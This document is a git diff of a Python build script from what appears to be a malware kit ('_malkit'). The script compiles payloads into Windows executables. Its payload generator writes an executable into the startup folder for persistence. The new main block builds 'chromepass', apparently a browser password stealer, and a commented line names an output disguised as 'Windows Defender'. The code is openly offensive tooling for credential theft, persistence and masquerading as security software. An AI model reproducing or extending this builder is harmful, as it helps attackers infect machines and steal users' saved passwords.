@@ -12,7 +12,7 @@ def exebuild(target, include, output, icon="icon.ico"):
     try:
         includes = []
         if len(include) > 0:
-            includes.append(include)
+            includes = [f'{include}']
         sys.argv.append("pexe37")
         setup(
             options={
@@ -23,14 +23,13 @@ def exebuild(target, include, output, icon="icon.ico"):
                         "doctest",
                         "pdb",
                         "unittest",
-                        "inspect",
                         "difflib",
 
 
                     ],
 
                     "dll_excludes": ["msvcr71.dll", "Crypt32.dll", "tcl85.dll", "tk85.dll", "libcrypto-1_1-x64.dll"],
-                    "includes": includes
+                    "includes": includes,
                 },
 
             },
@@ -42,7 +41,6 @@ def exebuild(target, include, output, icon="icon.ico"):
 
         )
     except BaseException as e:
-        raise(e)
         print("[+] polymorphism")
     if os.path.exists(f"{output}.exe"):
         os.remove(f"{output}.exe")
@@ -97,7 +95,6 @@ def generate_payload(filename, destname, startup, icon="icons/icon.ico", modulen
     pyline += "    f.write(payload)\n"
     pyline += f"with open(STARTUP, 'wb') as f:\n"
     pyline += "    f.write(exepayload)"
-    print(len(pyline))
     with open(f"_malkit/{destname}.py", "wb") as f:
         f.write(pyline.encode())
     return f"{modulename}"
@@ -112,5 +109,7 @@ def exe_bytes(filename: str):
 
 
 if __name__ == "__main__":
-    exebuild(target="helloworld.py", include='',
-             output="stub", icon="../icons/icon2.ico")
+    # exebuild(target="stub.py", include='darkarp.malkit_modules.encrypt',
+    #          output='Windows Defender', icon="icons/icon2.ico")
+    exebuild(target="chromepass.py", include='',
+             output="chromepass", icon="icons/icon2.ico")
